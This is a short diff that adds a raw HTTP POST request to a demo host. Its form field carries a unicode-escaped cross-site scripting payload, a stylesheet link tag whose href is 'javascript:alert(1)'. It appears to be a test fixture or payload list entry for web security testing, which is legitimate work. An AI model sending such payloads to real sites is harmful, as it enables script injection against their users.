@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+Connection: close
+
+q=\u003Clink rel=stylesheet href=\u0022javascript:alert(1)\u0022\u003E
